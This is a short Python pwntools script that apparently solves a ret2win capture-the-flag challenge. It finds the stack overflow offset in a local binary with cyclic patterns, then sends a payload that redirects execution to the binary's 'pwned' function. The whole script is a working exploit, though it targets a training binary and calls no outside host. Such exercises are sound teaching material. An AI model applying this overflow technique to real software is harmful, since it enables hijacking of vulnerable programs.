from pwn import *

def find_eip_offset(binary):
    '''
    Automate the process of using cyclic patterns to find the offset
    '''
    proc = process(binary)
    proc.recvuntil(b':', timeout=1)
    proc.sendline(cyclic(100))
    proc.wait() # process will crash
    return cyclic_find(proc.corefile.pc)

# load the binary
binary = './ret2win1'
elf = context.binary = ELF(binary, checksec = False)

# turn on debugging messages
context.log_level = 'debug'

# execute the binary
proc = process(binary)

# find the offset of the eip value
offset = find_eip_offset(binary)

# prepare our payload
payload = flat(
    b'a' * offset,
    elf.functions.pwned
)
write(f'{binary}.payload', payload)

# wait for the prompt, then send our password payload
proc.recvuntil(b':', timeout=1)
proc.sendline(payload)

# print the result
proc.interactive()
